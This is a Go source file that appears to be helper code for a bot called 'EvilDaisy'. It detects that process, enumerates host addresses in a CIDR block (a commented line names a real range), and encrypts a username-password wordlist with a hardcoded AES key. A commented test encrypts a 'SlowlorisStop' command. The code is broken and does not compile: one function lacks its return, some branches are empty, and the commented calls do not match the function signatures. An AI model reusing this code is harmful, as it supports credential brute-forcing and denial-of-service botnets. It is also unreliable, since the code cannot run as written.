package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"os"
	"strings"

	ps "github.com/mitchellh/go-ps"
)

// GetOutboundIP ...
func GetOutboundIP() string {
	if conn, err := net.Dial("udp", "8.8.8.8:80"); err == nil {
		defer conn.Close()
		return conn.LocalAddr().String()
	}

	return "0.0.0.0"
}

// CheckProcess ...
func CheckProcess() bool {
	if processes, err := ps.Processes(); err == nil {
		for _, x := range processes {
			if x.Executable() == "EvilDaisy" {

			}
		}
	} else {
		fmt.Println(err.Error())
	}

}

// Hosts ...
func Hosts(cidr string) ([]string, error) {
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}

	var ips []string
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		ips = append(ips, ip.String())
	}
	// remove network address and broadcast address
	return ips[1 : len(ips)-1], nil
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

// WordlistToMap ...
func WordlistToMap() {
	if file, err := os.Open("wordlist.txt"); err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		i := 0
		for scanner.Scan() {
			i++
			tmpStrings := strings.Split(scanner.Text(), "||")

			if len(tmpStrings) == 2 {
				if tmpStrings[1] != "" {
					fmt.Printf("%d : \"%s\", //%s||%s\n", i, string(string(Encrypt(tmpStrings[0], []byte("baea1baf0bc433ec")))+"||"+string(Encrypt(tmpStrings[1], []byte("baea1baf0bc433ec")))), tmpStrings[0], tmpStrings[1])
				} else {
					fmt.Printf("%d : \"%s||\", //%s:\n", i, string(Encrypt(tmpStrings[0], []byte("baea1baf0bc433ec"))), tmpStrings[0])
				}
			}
		}
		if err := scanner.Err(); err != nil {
			fmt.Println(err.Error())
		}
	} else {
		fmt.Println(err.Error())
	}
}

func main() {
	CheckProcess()
	//fmt.Println(GetOutboundIP())
	//LocalIPScan()
	//WordlistToMap()
	//array, _ := Hosts("41.223.40.0/22")
	//fmt.Println(array)
	/*
		for i := 0; i < 100; i++ {
			fmt.Printf("%d : %s,\n", i, "\"\"")
		}
	*/

	/*
		if encrypt, err := Encrypt("SlowlorisStop", []byte("baea1baf0bc433ec")); err == nil {
			fmt.Println(string(encrypt))
			if decrypt, err := Decrypt(string(encrypt), []byte("baea1baf0bc433ec")); err == nil {
				fmt.Println(string(decrypt))
			} else {
				fmt.Println(err.Error())
			}
		} else {
			fmt.Println(err.Error())
		}
	*/
}

// Encrypt ...
func Encrypt(text string, key []byte) []byte {
	text = "kocacizmelimehmetagakocacizmelimehmetagakocacizmelimehmetaga:" + text
	plainText := []byte(text)
	if block, err := aes.NewCipher(key); err == nil {
		cipherText := make([]byte, aes.BlockSize+len(plainText))
		iv := cipherText[:aes.BlockSize]
		if _, err := io.ReadFull(rand.Reader, iv); err == nil {
			stream := cipher.NewCFBEncrypter(block, iv)
			stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)
			return []byte(base64.URLEncoding.EncodeToString(cipherText))
		} else {
			return nil
		}
	} else {
		return nil
	}
}

// Decrypt ...
func Decrypt(cryptoText string, key []byte) ([]byte, error) {
	if cipherText, err := base64.URLEncoding.DecodeString(cryptoText); err == nil {
		if block, err := aes.NewCipher(key); err == nil {
			if len(cipherText) < aes.BlockSize {

			}

			iv := cipherText[:aes.BlockSize]
			cipherText = cipherText[aes.BlockSize:]
			stream := cipher.NewCFBDecrypter(block, iv)
			stream.XORKeyStream(cipherText, cipherText)
			s := string(cipherText[:])
			return []byte(s[61:]), nil
		} else {
			return nil, err
		}
	} else {
		return nil, err
	}
}
